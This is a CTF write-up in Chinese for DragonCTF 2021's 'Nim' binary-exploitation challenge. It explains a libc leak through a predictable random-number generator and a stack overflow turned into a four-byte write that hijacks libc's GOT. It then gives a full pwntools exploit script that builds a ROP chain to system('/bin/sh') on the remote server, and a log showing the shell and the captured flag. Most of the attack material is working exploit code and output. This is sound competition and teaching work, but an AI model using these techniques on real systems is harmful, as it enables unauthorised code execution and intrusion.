# DragonCTF2021-Nim


# Nim

周末和Nu1L的师傅一起打了DragonCTF，题目质量很高，被师傅们带了。

Nim实现了尼姆游戏（Nim），玩家和Dealer（电脑）轮流从堆中取石头，堆的数目大于等于8，每次只能从一个堆中取，取的数量要大于0。谁将最后一块取出即可赢得游戏。

程序有两个漏洞点可以利用：

- 使用rand函数地址，自己实现的伪随机数生成函数
- 堆的数量由玩家指定造成的栈溢出

程序开启了所有的保护，这代表着有Canary。
栈溢出很容易都能看出来，但是我并没有重视rand函数。在分析的时候，我发现这个程序是由c & c++混写的，所以我尝试用异常处理去绕过canary保护。实际的利用并不是这样。

首先，第一个堆块的石头数量为`rand & 0x7fffffff`，可以通过模拟其随机数生成，得到rand函数的地址从而leak libc。

第二点是，game程序有八个参数，这意味着有两个参数会通过栈进行传递。二栈溢出可以对它们进行修改。注意到在游戏结束后，我们的分数如果超过记录，则会将分数（int），放到第八个参数指向的位置。Yes，我们可以任意地址写四字节数据。

之后，会触发``__stack_chk_fail`，进一步执行`__fortify_fail` -> `__libc_message`，`__libc_message`中通过libc@got调用了三个函数`strchrnul`， `strlen` 和 `mempcpy`。libc@got可写，所以我们通过任意地址写四字节即可劫持got表。

继续分析，此时栈的0x2a8附近有我们的在游戏开始输入的name，再向下就是堆中的石头数目。通过gadget回到name中，设置堆中的石头数目为ROP，以name为跳板，执行到ROP。

```assembly
0x0000000000089d27: add rsp, 0x2c0; pop rbp; pop r12; pop r13; ret; 
```

在leak libc之后，我们不得不面对Nim游戏。满足下面条件则先手必败：
$$a_1\oplus a_2\oplus a_3...\oplus a_n = 0$$
通过模拟随机数生成函数，可以预测出Dealer的所有堆块。之后只要设置我们的堆块，使所有堆块石子数目异或和为0，则Dealer面对的就是必败状态。它不得不取出石子，这样异或和改变，我们只要取出异或和数量的石子数，就能一直将必败状态留给Dealer。从而使分数到达我们的目标值。

```python
from pwn import *
leak = lambda name,addr: log.success('{0} ---> {1}'.format(name, hex(addr)))

binary = './nim'
libc = './libc.so'
context.terminal = ['tmux', 'splitw', '-h']
context(binary = binary, log_level='info')
# p = process(binary)
p = remote('nim.hackable.software',1337)
elf = ELF(binary, checksec=False)
libc = ELF(libc, checksec=False)

const_num1 = 0x7CC216571FEE6FB
const_num2 = 0xFFFFFFFFFFFFFA3

class RandSim:
    seed = 0
    def __init__(self):
        self.seed = 0
    def set_seed(self, seed):
        self.seed = seed
    
    def get_next(self):
        val = self.seed & 0x7fffffff
        self.seed = self.rand_sim(self.seed)    
        return val          
                
    def rand_sim(self,s):
        val = 0
        min = 0x7CC216571FEE6FB
        while s != 0:
            if(s &1) !=0:
                val = (min+val) % 0xFFFFFFFFFFFFFA3
            s = s >> 1
            min = 2 * min % 0xFFFFFFFFFFFFFA3
        return val

Randgen = RandSim()
          
def get_dealer():
    p.recvuntil("Dealer has taken ")
    num = int(p.recvuntil(" stone(s)",drop=True),10)
    p.recvuntil("from heap ")
    idx = int(p.recvuntil(".\n",drop=True),10)
    return num, idx
def nim(heaps):
    sum = 0
    for i in heaps:
        sum = sum^i
    if sum:
        for i in range(len(heaps)):
            val = sum^heaps[i]
            if val < heaps[i]:
                return i, heaps[i]-val
    else:
        for i in range(len(heaps)):
            if heaps[i] !=0 :
                return i, heaps[i]

def win(bet):
    heaps = []
    for i in range(4):
        heaps.append(Randgen.get_next())
    heaps.append(heaps[0])
    heaps.append(heaps[1])
    heaps.append(heaps[2])
    heaps.append(heaps[3])
    p.sendlineafter("game? ", str(bet))
    p.sendlineafter("s?", '8')
    for i in range(4):
        p.sendlineafter(": ",str(heaps[i]))
    while 1:
        last = 0
        p.recvuntil("The current set of heaps is: [")
        heap_list = map(int, p.recvuntil("]",drop=True).split(", "))        
        idx, val = nim(heap_list)
            
        p.sendlineafter("resign): ",str(idx+1))
        p.sendlineafter("heap: ",str(val))
        if heap_list.count(0) == len(heap_list)-1:
            last = 1
        if last:
            p.recvuntil("Current score: ")
            cur = int(p.recvuntil(". C",drop=True),10)
            return cur

def win_game(cur,target):
    while 1:
        off = target - cur
        if(off>=cur):
            cur = win(cur)
        else:
            cur = win(off)
        leak("current scores ", cur)
        if(cur == target): break
        p.sendlineafter("[y/n]? ",'y')

def main():
    global p
    p.sendlineafter("Choice: ", 'P')
    p.sendlineafter("name? ","Niebelungen")

    # libc 
    p.sendlineafter("game? ", '1')
    p.sendlineafter("?", '8')
    for i in range(4):
        p.sendlineafter(": ",'1')

    num, idx = get_dealer()
    p.recvuntil("The current set of heaps is: [")
    heap_list = map(int, p.recvuntil("]",drop=True).split(", "))
    heap_list[idx-1] += num

    rand_addr = 0
    for i in range(2**10):
        guess = (0x7e << 40) | (i << 31) | heap_list[0] 
        num = Randgen.rand_sim(guess)
        if (num & 0x7FFFFFFF) == heap_list[1]:
            rand_addr = guess
            break
    libc_base = rand_addr - libc.sym["rand"]
    Randgen.set_seed(rand_addr)
    for i in range(4):
        Randgen.get_next()
    leak("libc base", libc_base)

    p.sendlineafter("resign): ",'0')
    p.sendlineafter("[y/n]? ",'n')

    # strchrnul@libc.got    0x1eb040
    # strlen@libc.got       0x1eb0a8
    # memcpy@libc.got       0x1eb148
    # name - stack 0x2a8 
    # + 0x20       0x2c8 
    # + 0x20       0x2e8
    
    system = libc_base + libc.sym['system']
    binsh = libc_base + libc.search("/bin/sh").next()
    pop_rdi = libc_base + 0x0000000000026b72
    libc_got = libc_base + 0x1eb0a8
    rsp_2d8 = libc_base + 0x0000000000089d27
    rsp_c8 = libc_base + 0x00000000000e7b3a

    p.sendlineafter("Choice: ", 'P')
    p.sendlineafter("name? ", p64(rsp_c8)*3+p64(rsp_c8)[:6])

    '''
    for this game, dealer is the fisrt to take
    we must make checksum == 0
    '''
    target = (rsp_2d8+1)&0xffffffff
    leak("target",target)
    if(target>>31 & 1):
        log.info("Sorry, target <0!")
        return 
    win_game(9999+1, target)
    
    # lost 1 bet and rop
    p.sendlineafter("[y/n]? ",'y')
    p.sendlineafter("game? ", '1')
    p.sendlineafter("?", '60')
    rop = [
        1,2,3,4,5,6,7,8,9,10,11,12,
        libc_got&0xffffffff,
        (libc_got>>32)&0xffffffff,
        15,16,17,18,
        pop_rdi&0xffffffff,
        (pop_rdi>>32)&0xffffffff,
        binsh&0xffffffff,
        (binsh>>32)&0xffffffff,
        system&0xffffffff,
        (system>>32)&0xffffffff,
        25,26,27,28,29,30          
    ]
    for i in rop:
        p.sendlineafter(": ", str(i))
    p.sendlineafter("resign): ",'0')
    p.sendlineafter("[y/n]? ",'n')   

    p.interactive()

if __name__ == "__main__":
    main()
```

A very funny challenge !

```python
[+] Opening connection to nim.hackable.software on port 1337: Done
[+] libc base ---> 0x7f6f70f58000
[+] target ---> 0x70fe1d28
[+] current scores  ---> 0x4e20
[+] current scores  ---> 0x9c40
[+] current scores  ---> 0x13880
[+] current scores  ---> 0x27100
[+] current scores  ---> 0x4e200
[+] current scores  ---> 0x9c400
[+] current scores  ---> 0x138800
[+] current scores  ---> 0x271000
[+] current scores  ---> 0x4e2000
[+] current scores  ---> 0x9c4000
[+] current scores  ---> 0x1388000
[+] current scores  ---> 0x2710000
[+] current scores  ---> 0x4e20000
[+] current scores  ---> 0x9c40000
[+] current scores  ---> 0x13880000
[+] current scores  ---> 0x27100000
[+] current scores  ---> 0x4e200000
[+] current scores  ---> 0x70fe1d28
[*] Switching to interactive mode
[!] "`-._,-'"`-._,-' NEW ALL TIME RECORD: 1895701799 pts "`-._,-'"`-._,-'
$ ls
flag.txt
nim
$ cat flag.txt
DrgnS{St4ck_b0f_still_expl0itable_in_2021}
```

